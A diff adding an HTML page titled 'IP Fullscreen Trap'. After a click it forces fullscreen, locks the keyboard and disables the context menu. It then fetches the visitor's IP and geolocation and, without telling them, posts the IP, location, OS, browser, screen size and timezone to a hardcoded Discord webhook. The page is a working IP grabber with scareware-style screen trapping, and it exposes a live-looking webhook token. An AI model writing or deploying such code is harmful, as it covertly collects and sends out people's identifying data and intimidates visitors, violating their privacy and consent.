@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>IP Fullscreen Trap</title>
+<style>
+  html, body {
+    margin: 0; padding: 0;
+    height: 100%;
+    background: #111;
+    color: #0f0;
+    font-family: monospace;
+    user-select: none;
+    overflow: hidden;
+  }
+  #ip {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 5vw;
+    white-space: nowrap;
+    text-align: center;
+    display: none;
+  }
+  #location {
+    position: absolute;
+    top: 60%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 3vw;
+    white-space: nowrap;
+    text-align: center;
+    display: none;
+    color: #0af;
+  }
+  #startBtn {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 3vw;
+    padding: 20px 40px;
+    cursor: pointer;
+    background: #222;
+    border: 2px solid #0f0;
+    color: #0f0;
+    user-select: none;
+  }
+  #startBtn:hover {
+    background: #0f0;
+    color: #111;
+  }
+  #warning {
+    position: absolute;
+    bottom: 20px;
+    width: 100%;
+    text-align: center;
+    font-size: 1.5vw;
+    color: #f00;
+    display: none;
+  }
+</style>
+</head>
+<body>
+  <button id="startBtn">Click to Start</button>
+  <div id="ip">Loading IP...</div>
+  <div id="location"></div>
+  <div id="warning">Keyboard locked! Use Ctrl+Alt+Shift+F5 to exit</div>
+
+<script>
+  const startBtn = document.getElementById('startBtn');
+  const ipDiv = document.getElementById('ip');
+  const locationDiv = document.getElementById('location');
+  const warningDiv = document.getElementById('warning');
+  let isActive = false;
+
+  // Request fullscreen and lock keyboard
+  async function activateTrap() {
+    try {
+      await document.documentElement.requestFullscreen();
+      
+      if (navigator.keyboard && navigator.keyboard.lock) {
+        try {
+          await navigator.keyboard.lock();
+          warningDiv.style.display = 'block';
+        } catch (keyboardLockError) {
+          console.warn('Keyboard lock failed:', keyboardLockError);
+        }
+      }
+      
+      return true;
+    } catch (err) {
+      console.error('Failed to activate trap:', err);
+      return false;
+    }
+  }
+
+  // Cleanup function
+  async function cleanup() {
+    if (!isActive) return;
+    
+    isActive = false;
+    
+    if (navigator.keyboard && navigator.keyboard.unlock) {
+      await navigator.keyboard.unlock();
+    }
+    
+    if (document.exitFullscreen) {
+      await document.exitFullscreen();
+    }
+    
+    document.removeEventListener('fullscreenchange', onFullscreenChange);
+    document.removeEventListener('contextmenu', onContextMenu);
+    
+    ipDiv.style.display = 'none';
+    locationDiv.style.display = 'none';
+    warningDiv.style.display = 'none';
+    startBtn.style.display = 'block';
+  }
+
+  function onContextMenu(e) {
+    e.preventDefault();
+    return false;
+  }
+
+  function onFullscreenChange() {
+    if (!document.fullscreenElement && isActive) {
+      ipDiv.textContent = 'Fullscreen was exited! Click to reactivate';
+      startBtn.style.display = 'block';
+      warningDiv.style.display = 'none';
+      isActive = false;
+    }
+  }
+
+  // Get location from IP
+  async function getLocation(ip) {
+    try {
+      const response = await fetch(`https://ipapi.co/${ip}/json/`);
+      const data = await response.json();
+      
+      let locationText = '';
+      if (data.country_name) locationText += data.country_name;
+      if (data.region) locationText += `, ${data.region}`;
+      if (data.city) locationText += `, ${data.city}`;
+      
+      return locationText || 'Location unknown';
+    } catch (error) {
+      console.error('Error fetching location:', error);
+      return 'Location unavailable';
+    }
+  }
+
+  function parseUserAgent(userAgent) {
+    const ua = userAgent.toLowerCase();
+    let os = 'Unknown OS';
+    let bitness = '';
+    let browser = 'Unknown Browser';
+
+    // Detect OS
+    if (ua.includes('windows')) os = 'Windows';
+    else if (ua.includes('mac os')) os = 'macOS';
+    else if (ua.includes('linux')) os = 'Linux';
+    else if (ua.includes('android')) os = 'Android';
+    else if (ua.includes('ios')) os = 'iOS';
+
+    // Detect 32/64-bit (Windows only)
+    if (ua.includes('win64') || ua.includes('wow64')) bitness = '64-bit';
+    else if (ua.includes('win32')) bitness = '32-bit';
+
+    // Detect Browser
+    if (ua.includes('chrome/') && !ua.includes('edg/')) browser = 'Chrome';
+    else if (ua.includes('firefox/')) browser = 'Firefox';
+    else if (ua.includes('safari/') && !ua.includes('chrome/')) browser = 'Safari';
+    else if (ua.includes('edg/')) browser = 'Edge';
+    else if (ua.includes('opera/') || ua.includes('opr/')) browser = 'Opera';
+
+    return `${os} ${bitness} (${browser})`.trim();
+}
+
+  async function logToDiscord(ip, location, additionalData = {}) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1401399766960836812/pzJ7RDQgSDm14OcPcHAczBpe8Rds5INVBexmbPqez4UFCFrYw-VP4DF2ZVD-ZkyFjLq8'; // Replace with real URL
+
+    try {
+        const simplifiedUA = parseUserAgent(navigator.userAgent);
+
+        const embed = {
+            title: 'ThickDick logged an ip!',
+            color: 0xFF0000,
+            fields: [
+                { name: '🌐 IP', value: ip || 'Unknown', inline: true },
+                { name: '📍 Location', value: location || 'Unknown', inline: true },
+                { name: '💻 System', value: simplifiedUA, inline: true },
+                { name: '🖥️ Resolution', value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                { name: '⏰ Timezone', value: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown', inline: true }
+            ],
+            timestamp: new Date().toISOString()
+        };
+
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [embed] })
+        });
+    } catch (error) {
+        console.error('Failed to log to Discord:', error);
+    }
+}
+
+  startBtn.onclick = async () => {
+    isActive = true;
+    startBtn.style.display = 'none';
+    ipDiv.style.display = 'block';
+    ipDiv.textContent = 'Activating...';
+    locationDiv.style.display = 'block';
+    locationDiv.textContent = 'Detecting location...';
+
+    const success = await activateTrap();
+    if (!success) {
+      ipDiv.textContent = 'Error: Could not activate full trap';
+      startBtn.style.display = 'block';
+      isActive = false;
+      return;
+    }
+
+    try {
+      // Get IP address
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const ip = ipData.ip;
+      ipDiv.textContent = `IP: ${ip}`;
+      
+      // Get location
+      const location = await getLocation(ip);
+      locationDiv.textContent = location;
+      
+      // Log to Discord
+      await logToDiscord(ip, location, {
+        fullscreenStatus: isActive,
+        keyboardLockSupported: !!navigator.keyboard?.lock
+      });
+      
+    } catch (error) {
+      ipDiv.textContent = 'Could not fetch IP';
+      locationDiv.textContent = 'Location detection failed';
+      console.error('Error:', error);
+    }
+
+    document.addEventListener('fullscreenchange', onFullscreenChange);
+    document.addEventListener('webkitfullscreenchange', onFullscreenChange);
+    document.addEventListener('mozfullscreenchange', onFullscreenChange);
+    document.addEventListener('MSFullscreenChange', onFullscreenChange);
+    document.addEventListener('contextmenu', onContextMenu, {capture: true});
+
+    document.addEventListener('keydown', async (e) => {
+      if (e.ctrlKey && e.altKey && e.shiftKey && (e.key === 'F5' || e.code === 'F5')) {
+        await cleanup();
+      }
+    }, {capture: true});
+  };
+</script>
+</body>
+</html>
